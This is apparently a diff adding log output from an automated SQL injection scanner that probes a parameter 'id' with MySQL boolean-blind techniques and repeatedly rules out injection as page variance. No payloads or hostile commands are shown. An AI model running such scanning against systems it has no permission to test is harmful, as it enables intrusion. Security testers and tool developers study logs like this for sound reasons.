+    [B-bool] [MySQL] 'id' req#478 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#479)
+[*] testing 'MySQL header boolean-blind' (param='id' req#535)
+    [B-bool] [MySQL] 'id' req#480 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#481)
+[*] testing 'MySQL header boolean-blind' (param='id' req#536)
+    [B-bool] [MySQL] 'id' req#482 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#483)
+[*] testing 'MySQL header boolean-blind' (param='id' req#537)
+[*]    Wasserstein comparison probe (param='id' req#449)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#538)
+    [B-bool] [MySQL] 'id' req#484 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#485)
+[*] testing 'MySQL header boolean-blind' (param='id' req#539)
+    [B-bool] [MySQL] 'id' req#450 sim=0.562 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#451)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#540)
+    [B-bool] [MySQL] 'id' req#486 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#452 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#487)
+[*] testing 'MySQL header boolean-blind' (param='id' req#541)
+[*]    Wasserstein comparison probe (param='id' req#453)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#542)
+    [B-bool] [MySQL] 'id' req#488 sim=0.625 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#489)
+[*] testing 'MySQL header boolean-blind' (param='id' req#543)
+    [B-bool] [MySQL] 'id' req#454 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#455)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#544)
+    [B-bool] [MySQL] 'id' req#490 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#491)
+[*] testing 'MySQL header boolean-blind' (param='id' req#545)
+    [B-bool] [MySQL] 'id' req#492 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#493)
+[*] testing 'MySQL header boolean-blind' (param='id' req#546)
+    [B-bool] [MySQL] 'id' req#456 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#457)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#547)
+    [B-bool] [MySQL] 'id' req#494 sim=0.562 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#495)
+[*] testing 'MySQL header boolean-blind' (param='id' req#548)
+    [B-bool] [MySQL] 'id' req#458 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#459)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#549)
+    [B-bool] [MySQL] 'id' req#496 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#497)
+[*]   [Wasserstein] dist=0.6660 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#550)
+    [B-bool] [MySQL] 'id' req#460 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#461)
+    [B-bool] [MySQL] 'id' req#498 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#499)
+[*]   [Wasserstein] dist=0.6659 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#551)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#552)
+    [B-bool] [MySQL] 'id' req#500 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#501)
+[*]   [Wasserstein] dist=0.6659 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#553)
+    [B-bool] [MySQL] 'id' req#462 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#463)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#554)
+    [B-bool] [MySQL] 'id' req#464 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#465)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#555)
+    [B-bool] [MySQL] 'id' req#502 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#503)
+[*]   [Wasserstein] dist=0.6660 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#556)
+    [B-bool] [MySQL] 'id' req#466 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#467)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#557)
+    [B-bool] [MySQL] 'id' req#504 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#505)
+[*]   [Wasserstein] dist=0.6660 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#558)
+    [B-bool] [MySQL] 'id' req#468 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#506 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#507)
+[*]   [Wasserstein] dist=0.6659 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#559)
+[*]    Wasserstein comparison probe (param='id' req#469)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#560)
+    [B-bool] [MySQL] 'id' req#470 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#471)
+    [B-bool] [MySQL] 'id' req#508 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#509)
+[*]   [Wasserstein] dist=0.6659 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#561)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#562)
+    [B-bool] [MySQL] 'id' req#510 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#511)
+[*]   [Wasserstein] dist=0.6660 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#563)
+    [B-bool] [MySQL] 'id' req#472 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#473)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#564)
+    [B-bool] [MySQL] 'id' req#512 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#513)
+[*]   [Wasserstein] dist=0.6660 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#565)
+    [B-bool] [MySQL] 'id' req#474 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#475)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#566)
+    [B-bool] [MySQL] 'id' req#514 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#515)
+[*]   [Wasserstein] dist=0.6659 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#567)
+    [B-bool] [MySQL] 'id' req#476 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#477)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#568)
+    [B-bool] [MySQL] 'id' req#516 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#517)
+[*] testing 'MySQL header boolean-blind' (param='id' req#569)
+    [B-bool] [MySQL] 'id' req#478 sim=0.625 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#479)
+[*]   [Wasserstein] dist=0.6663 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6663 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#570)
+    [B-bool] [MySQL] 'id' req#518 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#519)
+[*] testing 'MySQL header boolean-blind' (param='id' req#571)
+    [B-bool] [MySQL] 'id' req#480 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#481)
+[*]   [Wasserstein] dist=0.6664 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6663 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#572)
+    [B-bool] [MySQL] 'id' req#520 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#482 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#521)
+[*] testing 'MySQL header boolean-blind' (param='id' req#573)
+[*]    Wasserstein comparison probe (param='id' req#483)
+[*] testing 'MySQL AND boolean-based blind' (param='id' req#574)
+    [B-bool] [MySQL] 'id' req#522 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#523)
+[*] testing 'MySQL header boolean-blind' (param='id' req#575)
+    [B-bool] [MySQL] 'id' req#484 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#524 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#525)
+[*] testing 'MySQL header boolean-blind' (param='id' req#576)
+[*]    Wasserstein comparison probe (param='id' req#485)
+[*] [TECH-NODIFF] POST:MySQL:B: 100 consecutive no-diff responses — rotating to next tech
+[*] ├─ [1/10] MySQL › Boolean    │ tech=BH   │ 634 base payloads (3181 expanded)
+[*] testing 'MySQL header boolean-blind' (param='id' req#577)
+    [B-bool] [MySQL] 'id' req#486 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#487)
+[*] testing 'MySQL header boolean-blind' (param='id' req#578)
+    [B-bool] [MySQL] 'id' req#488 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#489)
+[*] testing 'MySQL header boolean-blind' (param='id' req#579)
+    [B-bool] [MySQL] 'id' req#490 sim=0.562 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#491)
+[*] testing 'MySQL header boolean-blind' (param='id' req#580)
+    [B-bool] [MySQL] 'id' req#492 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#493)
+[*] testing 'MySQL header boolean-blind' (param='id' req#581)
+    [B-bool] [MySQL] 'id' req#526 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#527)
+[*] testing 'MySQL header boolean-blind' (param='id' req#582)
+    [B-bool] [MySQL] 'id' req#494 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#495)
+[*]   [Wasserstein] dist=0.6659 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#583)
+    [B-bool] [MySQL] 'id' req#528 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#529)
+[*] testing 'MySQL header boolean-blind' (param='id' req#584)
+    [B-bool] [MySQL] 'id' req#496 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#497)
+[*]   [Wasserstein] dist=0.6659 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#585)
+    [B-bool] [MySQL] 'id' req#498 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#499)
+[*]   [Wasserstein] dist=0.6659 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#586)
+    [B-bool] [MySQL] 'id' req#530 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#531)
+[*] testing 'MySQL header boolean-blind' (param='id' req#587)
+    [B-bool] [MySQL] 'id' req#500 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#501)
+[*]   [Wasserstein] dist=0.6658 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6658 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#588)
+    [B-bool] [MySQL] 'id' req#532 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#533)
+[*] testing 'MySQL header boolean-blind' (param='id' req#589)
+    [B-bool] [MySQL] 'id' req#502 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#503)
+[*]   [Wasserstein] dist=0.6659 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6658 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#590)
+    [B-bool] [MySQL] 'id' req#534 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#535)
+[*] testing 'MySQL header boolean-blind' (param='id' req#591)
+    [B-bool] [MySQL] 'id' req#536 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#504 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#505)
+[*]   [Wasserstein] dist=0.6660 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6658 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#592)
+[*]    Wasserstein comparison probe (param='id' req#537)
+[*] testing 'MySQL header boolean-blind' (param='id' req#593)
+    [B-bool] [MySQL] 'id' req#506 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#507)
+[*]   [Wasserstein] dist=0.6659 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6658 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#594)
+    [B-bool] [MySQL] 'id' req#538 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#539)
+[*] testing 'MySQL header boolean-blind' (param='id' req#595)
+    [B-bool] [MySQL] 'id' req#508 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#509)
+[*]   [Wasserstein] dist=0.6659 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6658 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#596)
+    [B-bool] [MySQL] 'id' req#540 sim=0.625 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#541)
+[*] testing 'MySQL header boolean-blind' (param='id' req#597)
+    [B-bool] [MySQL] 'id' req#510 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#511)
+[*] testing 'MySQL header boolean-blind' (param='id' req#598)
+    [B-bool] [MySQL] 'id' req#542 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#543)
+[*] testing 'MySQL header boolean-blind' (param='id' req#599)
+    [B-bool] [MySQL] 'id' req#512 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#513)
+[*] testing 'MySQL header boolean-blind' (param='id' req#600)
+    [B-bool] [MySQL] 'id' req#544 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#545)
+[*] testing 'MySQL header boolean-blind' (param='id' req#601)
+    [B-bool] [MySQL] 'id' req#514 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#515)
+[*] testing 'MySQL header boolean-blind' (param='id' req#602)
+    [B-bool] [MySQL] 'id' req#546 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#547)
+[*] testing 'MySQL header boolean-blind' (param='id' req#603)
+    [B-bool] [MySQL] 'id' req#548 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#549)
+[*] testing 'MySQL header boolean-blind' (param='id' req#604)
+    [B-bool] [MySQL] 'id' req#516 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#517)
+[*] testing 'MySQL header boolean-blind' (param='id' req#605)
+    [B-bool] [MySQL] 'id' req#550 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#551)
+[*] testing 'MySQL header boolean-blind' (param='id' req#606)
+    [B-bool] [MySQL] 'id' req#518 sim=0.625 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#519)
+[*] testing 'MySQL header boolean-blind' (param='id' req#607)
+    [B-bool] [MySQL] 'id' req#520 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#521)
+[*] testing 'MySQL header boolean-blind' (param='id' req#608)
+    [B-bool] [MySQL] 'id' req#552 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#553)
+[*] testing 'MySQL header boolean-blind' (param='id' req#609)
+    [B-bool] [MySQL] 'id' req#522 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#523)
+[*] testing 'MySQL header boolean-blind' (param='id' req#610)
+    [B-bool] [MySQL] 'id' req#554 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#555)
+[*] testing 'MySQL header boolean-blind' (param='id' req#611)
+    [B-bool] [MySQL] 'id' req#556 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#557)
+[*] testing 'MySQL header boolean-blind' (param='id' req#612)
+    [B-bool] [MySQL] 'id' req#524 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#525)
+[*] testing 'MySQL header boolean-blind' (param='id' req#613)
+    [B-bool] [MySQL] 'id' req#558 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#559)
+[*] testing 'MySQL header boolean-blind' (param='id' req#614)
+    [B-bool] [MySQL] 'id' req#526 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#527)
+[*] testing 'MySQL header boolean-blind' (param='id' req#615)
+    [B-bool] [MySQL] 'id' req#560 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#561)
+[*] testing 'MySQL header boolean-blind' (param='id' req#616)
+    [B-bool] [MySQL] 'id' req#528 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#529)
+[*] testing 'MySQL header boolean-blind' (param='id' req#617)
+    [B-bool] [MySQL] 'id' req#530 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#531)
+[*]   [Wasserstein] dist=0.6659 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#618)
+    [B-bool] [MySQL] 'id' req#562 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#532 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#533)
+[*]   [Wasserstein] dist=0.6659 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#619)
+[*]    Wasserstein comparison probe (param='id' req#563)
+[*] testing 'MySQL header boolean-blind' (param='id' req#620)
+    [B-bool] [MySQL] 'id' req#534 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#535)
+[*]   [Wasserstein] dist=0.6841 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#621)
+    [B-bool] [MySQL] 'id' req#564 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#536 sim=0.578 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#537)
+[*]   [Wasserstein] dist=0.6659 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#622)
+[*]    Wasserstein comparison probe (param='id' req#565)
+[*] testing 'MySQL header boolean-blind' (param='id' req#623)
+    [B-bool] [MySQL] 'id' req#538 sim=0.609 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#539)
+[*]   [Wasserstein] dist=0.6659 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#624)
+    [B-bool] [MySQL] 'id' req#540 sim=0.547 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#541)
+[*]   [Wasserstein] dist=0.6781 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#625)
+    [B-bool] [MySQL] 'id' req#542 sim=0.500 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#543)
+[*]   [Wasserstein] dist=0.6781 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#626)
+    [B-bool] [MySQL] 'id' req#544 sim=0.516 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#545)
+[*]   [Wasserstein] dist=0.6781 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#627)
+    [B-bool] [MySQL] 'id' req#566 sim=0.438 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#567)
+[*] testing 'MySQL header boolean-blind' (param='id' req#628)
+    [B-bool] [MySQL] 'id' req#546 sim=0.547 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#547)
+[*]   [Wasserstein] dist=0.6781 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6659 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#629)
+    [B-bool] [MySQL] 'id' req#568 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#569)
+[*] testing 'MySQL header boolean-blind' (param='id' req#630)
+    [B-bool] [MySQL] 'id' req#548 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#549)
+[*]   [Wasserstein] dist=0.6781 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6781 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#631)
+    [B-bool] [MySQL] 'id' req#570 sim=0.438 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#550 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#551)
+[*]   [Wasserstein] dist=0.6781 ALL-HIGH-CONSISTENT (5/5 probes above threshold=0.50, min=0.6781 > 0.375, none below 0.15) -- uniformly-high page variance (CDN/dynamic), NOT injection
+[*] testing 'MySQL header boolean-blind' (param='id' req#632)
+[*]    Wasserstein comparison probe (param='id' req#571)
+[*] testing 'MySQL header boolean-blind' (param='id' req#633)
+    [B-bool] [MySQL] 'id' req#552 sim=0.469 combined=0.700 thresh=0.800 (diff) DIFF
+    [B-bool] [MySQL] 'id' req#572 sim=0.438 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#553)
+[*] testing 'MySQL header boolean-blind' (param='id' req#634)
+[*]    Wasserstein comparison probe (param='id' req#573)
+[*] testing 'MySQL header boolean-blind' (param='id' req#635)
+    [B-bool] [MySQL] 'id' req#554 sim=0.594 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#555)
+[*] testing 'MySQL header boolean-blind' (param='id' req#636)
+    [B-bool] [MySQL] 'id' req#574 sim=0.438 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#575)
+[*] testing 'MySQL header boolean-blind' (param='id' req#637)
+    [B-bool] [MySQL] 'id' req#556 sim=0.438 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#557)
+[*] testing 'MySQL header boolean-blind' (param='id' req#638)
+    [B-bool] [MySQL] 'id' req#576 sim=0.516 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#577)
+[*] testing 'MySQL header boolean-blind' (param='id' req#639)
+    [B-bool] [MySQL] 'id' req#578 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#579)
+[*] testing 'MySQL header boolean-blind' (param='id' req#640)
+    [B-bool] [MySQL] 'id' req#558 sim=0.422 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#559)
+[*] testing 'MySQL header boolean-blind' (param='id' req#641)
+    [B-bool] [MySQL] 'id' req#580 sim=0.531 combined=0.700 thresh=0.800 (diff) DIFF
+[*]    Wasserstein comparison probe (param='id' req#581)
+[*] testing 'MySQL header boolean-blind' (param='id' req#642)
